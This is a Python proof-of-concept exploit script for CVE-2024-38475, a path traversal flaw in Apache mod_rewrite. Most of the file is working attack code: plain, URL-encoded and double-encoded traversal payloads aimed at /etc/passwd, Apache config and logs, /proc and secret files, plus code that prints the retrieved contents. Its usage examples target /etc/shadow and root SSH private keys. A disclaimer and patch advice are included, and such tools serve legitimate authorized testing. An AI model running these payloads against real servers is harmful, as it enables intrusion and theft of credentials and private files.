#!/usr/bin/env python3
"""
CVE-2024-38475 Proof of Concept (PoC)
Apache HTTP Server mod_rewrite Path Traversal Vulnerability

Description:
    Improper escaping of output in mod_rewrite in Apache HTTP Server 2.4.59 
    and earlier allows an attacker to map URLs to filesystem locations that 
    are permitted to be served by the server but are not intentionally/directly 
    reachable by any URL, resulting in code execution or source code disclosure.

Author: Security Research Team
Date: October 2025
CVE: CVE-2024-38475
Affected: Apache HTTP Server 2.4.0 through 2.4.59
Fixed in: Apache HTTP Server 2.4.60

WARNING: This script is for educational and authorized testing purposes only!
"""

import requests
import argparse
import sys
import time
import urllib.parse
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
import os

# Initialize colorama for colored output
init(autoreset=True)

class CVE_2024_38475_PoC:
    def __init__(self, target_url, timeout=10, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False  # Disable SSL verification for testing
        
        # Suppress SSL warnings
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        
        # Test payloads for CVE-2024-38475
        self.payloads = [
            # Basic path traversal via files endpoint
            {
                'path': '/files/../../etc/passwd',
                'description': 'Path traversal to /etc/passwd via files endpoint',
                'expected_content': ['root:', 'bin:', 'daemon:']
            },
            {
                'path': '/files/../../../etc/hosts',
                'description': 'Path traversal to /etc/hosts via files endpoint',
                'expected_content': ['localhost', '127.0.0.1']
            },
            {
                'path': '/files/../../secret/confidential.txt',
                'description': 'Access to secret directory via path traversal',
                'expected_content': ['SECRET', 'CONFIDENTIAL', 'password']
            },
            
            # URL-encoded path traversal
            {
                'path': '/files/..%2F..%2Fetc%2Fpasswd',
                'description': 'URL-encoded path traversal to /etc/passwd',
                'expected_content': ['root:', 'bin:']
            },
            {
                'path': '/files/..%2F..%2F..%2Froot%2F.bashrc',
                'description': 'URL-encoded traversal to root bashrc',
                'expected_content': ['bash', 'alias', 'export']
            },
            
            # Double URL encoding
            {
                'path': '/files/%252E%252E%252F%252E%252E%252Fetc%252Fpasswd',
                'description': 'Double URL-encoded path traversal',
                'expected_content': ['root:']
            },
            
            # Via docs endpoint
            {
                'path': '/docs/../secret/data.txt',
                'description': 'Path traversal via docs endpoint',
                'expected_content': ['secret', 'data']
            },
            {
                'path': '/docs/..%2F..%2Fsecret%2Fpasswords.txt',
                'description': 'URL-encoded traversal via docs endpoint',
                'expected_content': ['password', 'secret']
            },
            
            # Via proxy endpoint
            {
                'path': '/proxy/test/../../etc/passwd',
                'description': 'Path traversal via proxy endpoint',
                'expected_content': ['root:', 'bin:']
            },
            
            # Query parameter injection
            {
                'path': '/redirect?path=../etc/passwd',
                'description': 'Query parameter path injection',
                'expected_content': ['root:'],
                'follow_redirects': True
            },
            {
                'path': '/redirect?path=../../secret/confidential.txt',
                'description': 'Query parameter injection to secret files',
                'expected_content': ['SECRET', 'CONFIDENTIAL'],
                'follow_redirects': True
            },
            
            # Apache config files
            {
                'path': '/files/../../usr/local/apache2/conf/httpd.conf',
                'description': 'Access to Apache configuration file',
                'expected_content': ['ServerRoot', 'LoadModule', 'DocumentRoot']
            },
            
            # Log files
            {
                'path': '/files/../../usr/local/apache2/logs/access_log',
                'description': 'Access to Apache access logs',
                'expected_content': ['GET', 'POST', 'HTTP']
            },
            {
                'path': '/files/../../usr/local/apache2/logs/error_log',
                'description': 'Access to Apache error logs',
                'expected_content': ['Apache', 'error', 'warn']
            },
            
            # System files
            {
                'path': '/files/../../proc/version',
                'description': 'Access to system version info',
                'expected_content': ['Linux', 'version']
            },
            {
                'path': '/files/../../proc/cpuinfo',
                'description': 'Access to CPU information',
                'expected_content': ['processor', 'cpu', 'MHz']
            }
        ]
    
    def print_banner(self):
        """Print PoC banner"""
        banner = f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════════════════════════╗
║                           CVE-2024-38475 Proof of Concept                    ║
║                   Apache mod_rewrite Path Traversal Vulnerability            ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║ Target: {self.target_url:<65} ║
║ Affected: Apache HTTP Server 2.4.0 through 2.4.59                           ║
║ Impact: Path traversal, code execution, source code disclosure               ║
║ Fixed in: Apache HTTP Server 2.4.60                                          ║
╚═══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    def check_target_availability(self):
        """Check if target is accessible"""
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            if self.verbose:
                print(f"{Fore.BLUE}[INFO] Target is accessible. Status: {response.status_code}{Style.RESET_ALL}")
            return True
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[ERROR] Target is not accessible: {e}{Style.RESET_ALL}")
            return False
    
    def test_payload(self, payload):
        """Test a single payload"""
        url = self.target_url + payload['path']
        
        print(f"\n{Fore.YELLOW}[TEST] {payload['description']}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[URL] {url}{Style.RESET_ALL}")
        
        try:
            # Configure follow_redirects
            follow_redirects = payload.get('follow_redirects', False)
            
            response = self.session.get(
                url, 
                timeout=self.timeout,
                allow_redirects=follow_redirects
            )
            
            status_code = response.status_code
            content = response.text
            
            if self.verbose:
                print(f"{Fore.BLUE}[INFO] Status Code: {status_code}{Style.RESET_ALL}")
                print(f"{Fore.BLUE}[INFO] Response Length: {len(content)} bytes{Style.RESET_ALL}")
            
            # Check for successful exploitation
            if status_code == 200:
                # Check if response contains expected content
                vulnerability_indicators = payload.get('expected_content', [])
                found_indicators = []
                
                for indicator in vulnerability_indicators:
                    if indicator.lower() in content.lower():
                        found_indicators.append(indicator)
                
                if found_indicators:
                    print(f"{Fore.RED}[VULNERABLE!] Path traversal successful!{Style.RESET_ALL}")
                    print(f"{Fore.RED}[EVIDENCE] Found indicators: {', '.join(found_indicators)}{Style.RESET_ALL}")
                    
                    # Show first few lines of content
                    lines = content.split('\n')[:5]
                    print(f"{Fore.GREEN}[CONTENT] First 5 lines:{Style.RESET_ALL}")
                    for i, line in enumerate(lines, 1):
                        if line.strip():
                            print(f"{Fore.GREEN}  {i}: {line[:80]}{'...' if len(line) > 80 else ''}{Style.RESET_ALL}")
                    
                    return True
                else:
                    print(f"{Fore.YELLOW}[PARTIAL] Got 200 OK but no vulnerability indicators found{Style.RESET_ALL}")
                    
            elif status_code == 403:
                print(f"{Fore.GREEN}[PROTECTED] Access denied (403 Forbidden){Style.RESET_ALL}")
            elif status_code == 404:
                print(f"{Fore.GREEN}[NOT FOUND] File not found (404){Style.RESET_ALL}")
            elif status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', 'Unknown')
                print(f"{Fore.YELLOW}[REDIRECT] {status_code} - Location: {location}{Style.RESET_ALL}")
                
                # Check if redirect location shows path traversal
                if '../' in location or '%2E%2E%2F' in location:
                    print(f"{Fore.RED}[VULNERABLE!] Redirect shows path traversal pattern!{Style.RESET_ALL}")
                    return True
            else:
                print(f"{Fore.BLUE}[INFO] Unexpected status code: {status_code}{Style.RESET_ALL}")
            
            return False
            
        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[ERROR] Request timed out{Style.RESET_ALL}")
            return False
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[ERROR] Request failed: {e}{Style.RESET_ALL}")
            return False
    
    def generate_custom_payloads(self, target_files):
        """Generate custom payloads for specific files"""
        custom_payloads = []
        
        for target_file in target_files:
            # Basic traversal
            payload = {
                'path': f'/files/../../{target_file}',
                'description': f'Custom payload for {target_file}',
                'expected_content': [target_file.split('/')[-1]]
            }
            custom_payloads.append(payload)
            
            # URL-encoded traversal
            encoded_file = urllib.parse.quote(target_file, safe='')
            payload = {
                'path': f'/files/..%2F..%2F{encoded_file}',
                'description': f'URL-encoded payload for {target_file}',
                'expected_content': [target_file.split('/')[-1]]
            }
            custom_payloads.append(payload)
        
        return custom_payloads
    
    def run_exploit(self, custom_files=None):
        """Run the complete exploit"""
        self.print_banner()
        
        if not self.check_target_availability():
            return False
        
        print(f"\n{Fore.YELLOW}[INFO] Starting CVE-2024-38475 exploitation...{Style.RESET_ALL}")
        
        vulnerabilities_found = 0
        total_tests = 0
        
        # Test default payloads
        for payload in self.payloads:
            total_tests += 1
            if self.test_payload(payload):
                vulnerabilities_found += 1
            time.sleep(0.5)  # Small delay between requests
        
        # Test custom files if provided
        if custom_files:
            print(f"\n{Fore.YELLOW}[INFO] Testing custom target files...{Style.RESET_ALL}")
            custom_payloads = self.generate_custom_payloads(custom_files)
            
            for payload in custom_payloads:
                total_tests += 1
                if self.test_payload(payload):
                    vulnerabilities_found += 1
                time.sleep(0.5)
        
        # Summary
        print(f"\n{Fore.CYAN}╔═══════════════════ EXPLOITATION SUMMARY ═══════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ Total tests performed: {total_tests:<36} ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ Vulnerabilities found: {vulnerabilities_found:<36} ║{Style.RESET_ALL}")
        
        if vulnerabilities_found > 0:
            print(f"{Fore.RED}║ STATUS: VULNERABLE TO CVE-2024-38475                   ║{Style.RESET_ALL}")
            print(f"{Fore.RED}║ RECOMMENDATION: Upgrade to Apache 2.4.60 or later     ║{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}║ STATUS: NOT VULNERABLE (or properly protected)         ║{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}╚═════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        
        return vulnerabilities_found > 0
    
    def generate_report(self, output_file):
        """Generate a detailed report"""
        print(f"\n{Fore.YELLOW}[INFO] Generating detailed report...{Style.RESET_ALL}")
        
        try:
            with open(output_file, 'w') as f:
                f.write("CVE-2024-38475 Vulnerability Assessment Report\n")
                f.write("=" * 50 + "\n\n")
                f.write(f"Target: {self.target_url}\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"CVE: CVE-2024-38475\n")
                f.write(f"Vulnerability: Apache mod_rewrite Path Traversal\n\n")
                
                f.write("Test Results:\n")
                f.write("-" * 20 + "\n\n")
                
                for i, payload in enumerate(self.payloads, 1):
                    f.write(f"{i}. {payload['description']}\n")
                    f.write(f"   URL: {self.target_url}{payload['path']}\n")
                    f.write(f"   Expected indicators: {', '.join(payload['expected_content'])}\n\n")
                
                f.write("\nMitigation Recommendations:\n")
                f.write("1. Upgrade Apache HTTP Server to version 2.4.60 or later\n")
                f.write("2. Review and fix vulnerable rewrite rules\n")
                f.write("3. Implement proper input validation\n")
                f.write("4. Use Web Application Firewall (WAF)\n")
                f.write("5. Regular security audits\n")
            
            print(f"{Fore.GREEN}[SUCCESS] Report saved to: {output_file}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to generate report: {e}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2024-38475 PoC - Apache mod_rewrite Path Traversal Vulnerability",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 cve-2024-38475-poc.py -u http://localhost
  python3 cve-2024-38475-poc.py -u https://target.com -v
  python3 cve-2024-38475-poc.py -u http://localhost -f etc/shadow,root/.ssh/id_rsa
  python3 cve-2024-38475-poc.py -u http://localhost -o report.txt
        """
    )
    
    parser.add_argument('-u', '--url', required=True, 
                       help='Target URL (e.g., http://localhost)')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('-t', '--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-f', '--files', type=str,
                       help='Comma-separated list of custom target files')
    parser.add_argument('-o', '--output', type=str,
                       help='Output file for detailed report')
    
    args = parser.parse_args()
    
    # Parse custom files
    custom_files = None
    if args.files:
        custom_files = [f.strip() for f in args.files.split(',')]
    
    # Initialize PoC
    poc = CVE_2024_38475_PoC(
        target_url=args.url,
        timeout=args.timeout,
        verbose=args.verbose
    )
    
    try:
        # Run exploitation
        is_vulnerable = poc.run_exploit(custom_files=custom_files)
        
        # Generate report if requested
        if args.output:
            poc.generate_report(args.output)
        
        # Exit with appropriate code
        sys.exit(0 if not is_vulnerable else 1)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[INFO] Interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}[FATAL] Unexpected error: {e}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()